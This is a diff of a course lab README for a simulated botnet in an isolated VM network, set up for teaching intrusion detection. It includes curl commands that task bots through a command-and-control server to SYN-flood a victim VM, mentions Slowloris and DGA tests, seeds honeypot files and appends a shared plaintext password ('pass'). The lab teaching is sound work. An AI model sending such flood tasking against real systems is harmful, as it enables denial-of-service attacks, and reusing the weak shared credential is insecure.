@@ -207,9 +207,7 @@ Verify in C2 console: you should see heartbeat check-ins from both bots.
 
 Push a task from any machine:
 ```bash
-curl -X POST http://192.168.100.10:5000/task \
-     -H "Content-Type: application/json" \
-     -d '{"bot_id":"all","type":"idle"}'
+curl -X POST http://192.168.100.10:5000/task -H "Content-Type: application/json" -d '{"bot_id":"all","type":"idle"}'
 ```
 
 View registered bots:
@@ -224,14 +222,14 @@ curl http://192.168.100.10:5000/bots
 **Start IDS first (victim VM):**
 ```bash
 sudo python3 ids_detector.py
+or
+(sudo PYTHONPATH="/home/vboxuser/.local/lib/python3.12/site-packages" python3 ids_detector.py)
 ```
 
 **SYN Flood (from bot VM):**
 ```bash
 # Push task via C2
-curl -X POST http://192.168.100.10:5000/task \
-     -H "Content-Type: application/json" \
-     -d '{"bot_id":"all","type":"syn_flood","target_ip":"192.168.100.20","duration":15}'
+curl -X POST http://192.168.100.10:5000/task -H "Content-Type: application/json" -d '{"bot_id":"all","type":"syn_flood","target_ip":"192.168.100.20","duration":15}'
 ```
 
 **Slowloris (from bot VM):**
@@ -260,6 +258,14 @@ Watch the IDS detect the DGA burst on the victim VM.
 
 ```bash
 # Start Cowrie on victim VM
+mkdir -p ~/.local/lib/python3.12/site-packages/cowrie/data/honeyfs/etc
+echo "root:x:0:0:root:/root:/bin/bash" > ~/.local/lib/python3.12/site-packages/cowrie/data/honeyfs/etc/passwd
+echo "root:x:0:" > ~/.local/lib/python3.12/site-packages/cowrie/data/honeyfs/etc/group
+mkdir -p etc
+echo "[honeypot]" > etc/cowrie.cfg
+mkdir -p ~/.local/lib/python3.12/etc
+echo "[honeypot]" > ~/.local/lib/python3.12/etc/cowrie.cfg
+echo "[honeypot]" > ~/cowrie.cfg
 cowrie start
 # Logs in: ~/.cowrie/var/log/cowrie/cowrie.json
 
@@ -311,3 +317,6 @@ Before any session:
 ---
 
 *AUA CS 232 / CS 337 Cybersecurity Spring 2026*
+
+
+password for all: pass
